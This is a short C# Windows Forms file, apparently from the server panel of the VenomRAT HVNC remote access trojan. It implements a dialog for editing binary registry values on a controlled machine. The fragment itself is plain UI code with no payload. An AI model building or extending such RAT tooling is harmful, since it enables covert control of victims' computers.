using System;
using System.Windows.Forms;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormRegValueEditBinary : Form
    {
        public FormRegValueEditBinary(RegistrySeeker.RegValueData value)
        {
            this._value = value;
            this.InitializeComponent();
            this.valueNameTxtBox.Text = RegValueHelper.GetName(value.Name);
            this.hexEditor.HexTable = value.Data;
        }

        private void okButton_Click(object sender, EventArgs e)
        {
            byte[] hexTable = this.hexEditor.HexTable;
            if (hexTable != null)
            {
                try
                {
                    this._value.Data = hexTable;
                    base.DialogResult = DialogResult.OK;
                    base.Tag = this._value;
                }
                catch
                {
                    this.ShowWarning("The binary value was invalid and could not be converted correctly.", "Warning");
                    base.DialogResult = DialogResult.None;
                }
            }
            base.Close();
        }

        private void ShowWarning(string msg, string caption)
        {
            MessageBox.Show(msg, caption, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        private readonly RegistrySeeker.RegValueData _value;

        private const string INVALID_BINARY_ERROR = "The binary value was invalid and could not be converted correctly.";
    }
}
